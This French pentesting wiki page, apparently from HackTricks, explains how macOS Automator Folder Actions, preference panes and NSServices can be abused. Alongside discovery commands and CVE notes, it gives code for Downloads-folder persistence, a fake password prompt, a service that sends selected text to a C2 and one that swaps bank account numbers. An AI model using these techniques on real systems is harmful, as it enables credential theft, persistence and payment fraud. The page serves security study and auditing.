# Abuse d'Automator, des panneaux de préférences et des NSServices

{{#include ../../../banners/hacktricks-training.md}}

## Actions et workflows Automator

### Informations de base

**Automator** est l'outil d'automatisation visuelle de macOS. Il exécute des **workflows** (bundles `.workflow`) composés d'**actions** (bundles `.action`). Automator alimente également les **Folder Actions**, les **Quick Actions** et l'intégration avec **Shortcuts**. Sur les versions récentes de macOS, les workflows peuvent aussi être **importés dans Shortcuts** : la même logique malveillante peut donc apparaître comme une Quick Action du Finder, un service utilisateur dans `~/Library/Services/` ou un raccourci reposant sur d'anciennes actions Automator.

Les actions Automator sont des **plugins** chargés dans le runtime Automator lorsqu'un workflow s'exécute. Elles peuvent :
- Exécuter des scripts shell arbitraires
- Traiter des fichiers et des données
- Interagir avec des applications via AppleScript
- Être enchaînées pour créer des automatisations complexes

### Pourquoi c'est important

> [!WARNING]
> Les workflows Automator peuvent être exécutés par **social engineering** — ils ressemblent à de simples fichiers document. Un bundle `.workflow` peut contenir des commandes shell intégrées qui s'exécutent lorsque le workflow est lancé. Combinés aux Folder Actions, ils fournissent une **persistance automatique** qui se déclenche lors d'événements liés aux fichiers. Les récentes corrections de Gatekeeper ont également montré que les **Quick Actions intégrées aux apps** (`Contents/PlugIns/*.workflow`) doivent être considérées comme du contenu exécutable, et non comme de simples données.

### Découverte
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Attaque : Social-Engineered Workflow

Un bundle `.workflow` ressemble à un fichier de document normal pour la plupart des utilisateurs :
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Attack: Folder Action Persistence

Les Folder Actions exécutent automatiquement un workflow lorsque des fichiers sont ajoutés à un dossier surveillé :
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions persistent après les redémarrages et s'exécutent silencieusement. Une Folder Action sur `~/Downloads` signifie que **chaque fichier téléchargé déclenche votre payload** — y compris les fichiers provenant de Safari, Chrome, AirDrop et les pièces jointes d'e-mails. Notez également que `System Events` peut enregistrer des Folder Actions pointant vers des scripts situés en dehors des emplacements par défaut `~/Library/Scripts/Folder Action Scripts`, ce qui rend la recherche de chemins isolés intéressante. Pour les implications TCC associées, consultez [la page TCC](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Informations de base

Les Preference panes (bundles `.prefPane`) sont des plugins chargés par **System Settings** (anciennement System Preferences). Ils fournissent des panneaux d'interface de configuration pour les fonctionnalités système ou tierces. Sur les anciens systèmes, ils étaient chargés directement par `System Preferences` ; dans les versions plus récentes, les panes tierces sont généralement prises en charge par un **service XPC legacy loader** lancé depuis System Settings.

### Pourquoi c'est important

- Les Preference panes s'exécutent dans un **processus hôte de confiance** lancé par System Settings / System Preferences
- Sur les systèmes modernes, cet hôte peut être un **service XPC `legacyLoader`** ; la frontière importante reste donc **processus d'interface Apple de confiance -> chargement de code tiers**
- Les Preference panes tierces héritent du **contexte de sécurité du processus hôte** et de la confiance de l'utilisateur associée à cette interface
- Les utilisateurs installent les Preference panes en les **ouvrant d'un double-clic** — ce qui facilite l'ingénierie sociale
- Une fois installées, elles **persistent** et se chargent chaque fois que System Settings s'ouvre sur ce panneau

### Découverte
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attaque : détournement du contexte de privilèges

Un panneau de préférences malveillant hérite du contexte de sécurité de l'**hôte du panneau** (historiquement `System Preferences`, et dans les versions plus récentes, souvent un helper `legacyLoader` lancé par `System Settings`) :
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Attaque : Persistance par installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attaque : UI Phishing

Un volet de préférences peut imiter des panneaux d’interface utilisateur système légitimes afin de **faire du phishing d’identifiants** :
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Informations de base

**NSServices** permet aux applications de fournir des fonctionnalités à d'autres apps via le **menu Services** (clic droit → Services). Lorsqu'un utilisateur sélectionne du texte ou des données et invoque un service, les données sélectionnées sont **envoyées au fournisseur du service** pour être traitées.

Les services sont déclarés dans le `Info.plist` d'une application sous la clé `NSServices` et enregistrés auprès du pasteboard server (`pbs`). macOS conserve également un **cache des services** et une **politique de restriction** qui déterminent quels services sont visibles et si les appelants sandboxed doivent recevoir un avertissement supplémentaire.

### Pourquoi c'est important

- Les services reçoivent un **flux de données inter-applications** — le texte sélectionné dans n'importe quelle application est envoyé au service
- Un service malveillant capture des données provenant de password managers, de clients email et d'applications financières
- Les services peuvent **renvoyer des données modifiées** à l'application appelante (man-in-the-middle sur les opérations de sélection)
- Les noms des services peuvent être conçus pour sembler légitimes (« Formater le texte », « Chiffrer la sélection », « Partager »)
- Le flag optionnel `NSRestricted` est pertinent pour la sécurité : un service marqué comme unrestricted peut être appelé par une app sandboxed sans l'avertissement affiché par macOS pour les services susceptibles de permettre une escape<sup>[[2]](#references)</sup>

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attaque : Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Attack: Modification des données (Man-in-the-Middle)

Un service peut **modifier les données renvoyées** tout en semblant fournir une fonction légitime:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Services restreints et abus modernes

Apple prend en charge un booléen `NSRestricted` facultatif pour chaque définition de service. Lorsqu'il est défini, macOS avertit les appelants sandboxés, car le service peut les aider à **sortir de la sandbox ou à franchir des limites de confidentialité**. D'un point de vue offensif, cela fournit deux axes d'audit utiles :

- Rechercher les services **third-party non marqués comme restricted**, même s'ils servent de proxy pour Apple Events, l'accès aux fichiers ou d'autres actions privilégiées
- Rechercher les **services intégrés à forte valeur** disposant d'entitlements puissants (par exemple, les services exposés par Script Editor ou les helpers s'appuyant sur Finder) et vérifier si l'interaction utilisateur suffit à les transformer en primitive d'accès aux données

Un bon exemple récent est **CVE-2022-48574**, où le mécanisme Services pouvait être exploité pour accéder à des **fichiers utilisateur protégés par TCC sans le flux de confirmation attendu**. Le bug est corrigé, mais la technique reste utile pour le threat modeling : tout service qui relaie des demandes d'accès aux fichiers ou d'automation au nom de l'appelant mérite le même niveau d'examen.<sup>[[2]](#references)</sup>

---

## Notes de sécurité récentes

- **Quick Actions sont du contenu exécutable** : Apple a corrigé en 2024 un contournement de Gatekeeper où une Quick Action Automator intégrée à une app pouvait s'exécuter sans l'évaluation normale. Lors de l'audit d'apps, inspectez `Contents/PlugIns/*.workflow/Contents/document.wflow` exactement comme vous inspecteriez des helper scripts ou des login items. Consultez [la page Gatekeeper](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts peuvent hériter du comportement legacy d'Automator** : Apple a également ajouté une invite supplémentaire de consentement utilisateur après la découverte de third-party shortcuts utilisant une **legacy Automator action** pour envoyer des Apple Events sans le flux de permissions attendu. Les workflows importés et les bundles de shortcuts doivent être examinés à la recherche de `Run AppleScript`, `Run Shell Script` et d'actions bridge similaires. Consultez [la page TCC](../macos-security-protections/macos-tcc/README.md).<sup>[[3]](#references)</sup>
- **Automator reste une privacy boundary active** : Apple a publié en 2025 un autre correctif Automator concernant l'accès à des données utilisateur protégées. Même si Automator est une surface legacy, considérez tout workflow runner, hôte de Quick Action ou bridge d'automation comme une surface d'attaque actuelle plutôt que comme du code mort.<sup>[[4]](#references)</sup>

---

## Chaînes d'attaque inter-techniques

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Volet de préférences → Élévation TCC
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Vol de gestionnaire de mots de passe
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Références

- [1] [Apple — À propos du contenu de sécurité de macOS Ventura 13.7, Sonoma 14.7 et Sequoia 15](https://support.apple.com/en-us/121238)
- [2] [Moonlock — Fonctionnement de l’exploit NSServices sur macOS](https://moonlock.com/nsservices-macos)
- [3] [Apple — À propos du contenu de sécurité de macOS Sonoma 14.6 (CVE-2024-40834)](https://support.apple.com/en-us/120911)
- [4] [Apple — À propos du contenu de sécurité de macOS Sequoia 15.4 (CVE-2025-30460)](https://support.apple.com/en-us/122373)

{{#include ../../../banners/hacktricks-training.md}}
